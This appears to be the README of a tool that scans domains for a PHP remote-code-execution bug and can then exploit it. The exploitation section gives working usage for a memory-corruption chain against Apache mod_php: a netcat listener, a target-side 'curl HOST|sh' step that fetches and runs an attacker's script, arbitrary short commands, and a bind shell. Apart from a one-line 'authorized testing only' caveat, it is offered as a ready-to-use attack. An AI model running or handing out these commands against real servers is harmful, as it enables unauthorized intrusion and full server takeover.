# php2shell-scanner

Check a domain and known subdomains for php2shell.

# Installation

With Nix flakes:

```
nix profile install "github:heywoodlh/php2shell-scanner"
```

If you want to run manually, install `amass` and `nuclei` and then run `run.py`.

## Nuclei template

The scanner uses the PHP2Shell nuclei template bundled in this repo as `php2shell.yaml`, next to `run.py`. It is expected to always be present there.

# Usage

Scan one or more URLs (repeat `--target` for several, scanned exactly as given):

```
php2shell-scanner --target "http://example.com"
php2shell-scanner -t "http://example.com" -t "http://localhost:9080"
```

Each `--target` is validated before scanning: it must be an `http://` or `https://` URL that answers an HTTP request. Untrusted TLS certificates are accepted (only reachability is checked). If a host does not respond, the scan aborts with an error. `--target` and `--domain` can be combined.

Scan a domain and all its subdomains:

```
php2shell-scanner --subdomain --domain example.com
```

Scan multiple domains and all their subdomains:

```
php2shell-scanner --subdomain -d example.com -d somedomain.com
```

## Paths

The nuclei template triggers the bug with a multipart POST, so any endpoint served by PHP is worth probing. Paths apply only to `--domain` targets — each path is joined to every domain. A URL passed with `--target` is always scanned exactly as given, with no path expansion. By default the paths in [`paths.txt`](paths.txt) are used. Add your own:

```
php2shell-scanner --domain example.com -p /upload.php -p /api/index.php
```

Or supply a path file (one path per line; blank lines and `#` comments are ignored):

```
php2shell-scanner --domain example.com --path-file ./my-paths.txt
```

`--path` entries are combined with the path file. When no `--path` or `--path-file` is given, the bundled `paths.txt` is used; pass `--path-file` explicitly to replace the defaults.

## Exploitation

With `--exploit`, the scanner first verifies the vulnerability on a **single** `--target` (the flag is rejected with multiple targets or with `--domain`), then runs a pure-Python exploit chain against it (worker rotation → Set-Cookie heap leak → libphp leak → forged-carrier `system()` call). No payload has to be staged on the server and Metasploit is not used:

```
# terminal 1: serve the shell script and catch the connection
nc -lvnp 4444 < script.sh
# terminal 2:
php2shell-scanner --target http://localhost:9080 --exploit --lhost 10.0.0.1 --lport 4444
```

The executed command is limited to 14 bytes by the forged carrier, so the shell is delivered by making the target fetch it from the attacker: `curl HOST|sh` (curl is present in php:apache images). Because of the 14-byte budget the host must be expressible very shortly: an inet_aton short form (`10.1` for 10.0.0.1, `127.1` for 127.0.0.1), a short DNS name you control (≤5 chars), or `0:PORT` when the listener runs on the target's own loopback. `--lport 80` gives the most room (`curl 10.1|sh`). If nothing fits, the tool says so and suggests alternatives.

Options: `--lhost`/`--lport` (shell target), `--command 'id>/out/p1'` to run a single arbitrary ≤14-byte command blind instead of a shell, `--bind-port N` for a bind shell instead of a reverse shell, and `--profile` (`official` for the official `php:8.4/8.5-apache` images, `official83`, `lab`), `--zif-offset`/`--dtor-offset`/`--htdata-offset` for per-build calibration, `--retries`, `--huge-mb`.

## Bind shell

With `--bind-port`, the fetched script instead starts a PHP listener on the target (no `nc`/`socat` needed — a mod_php target always has PHP), and the scanner connects to `<target-host>:<bind-port>` and drives the session itself (one command per line, output returned per line; type `exit` to close). The shell session therefore needs no listener and no target egress at all — only the one-shot script fetch has to reach the attacker:

```
php2shell-scanner --target http://localhost:9080 --exploit --bind-port 5555 --lhost 10.0.0.1 --lport 4444
```

If you already serve the bind-shell script somewhere (any path, plain text), pass `--no-serve` and point `--lhost`/`--lport` at it. The scanner still connects to the bind port automatically after firing.

The chain requires the same conditions as the public PoCs: Apache prefork + mod_php, `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`, single worker, `KeepAlive Off`, and an amd64 PHP 8.4/8.5 build whose libphp offsets match the profile (heap geometry is build- and environment-sensitive; leaks are retried and rotate the worker between attempts). Authorized testing only.

## Logging

Write only the findings (nuclei's matched results) to a file with `--log`:

```
php2shell-scanner --domain example.com --log findings.txt
```

Progress and status output still goes to the terminal; only matched results are written to the log file. Parent directories are created if needed.
